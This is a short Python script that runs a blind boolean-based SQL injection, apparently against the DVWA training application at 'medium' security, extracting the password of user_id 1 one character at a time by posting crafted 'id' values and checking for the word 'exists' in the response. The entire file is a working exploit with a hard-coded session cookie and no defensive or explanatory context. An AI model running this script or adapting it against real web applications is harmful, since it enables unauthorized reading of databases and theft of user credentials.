import requests
import sys
import re
from tqdm import tqdm
import time

args = sys.argv
url = args[1]

cookie ={
        "security":"medium",
        "PHPSESSID":"lj2skq5tmnd04ddhq3sjprm73e"
        }

for index in tqdm(range(1,32)):
    for char_number in range(48,123):
        
        sql = '1  and ASCII(substring((select password from users where user_id =1) ,{index},1))= binary {char};#'.format(index=index,char=char_number)

        payload = {
                "id":sql ,
                "Submit" : "Submit"
         }
        char = chr(char_number)
        response = requests.post(url,data=payload,cookies=cookie)
        if 'exists' in response.text:
            
            print(char,end='')
            break
print("")     
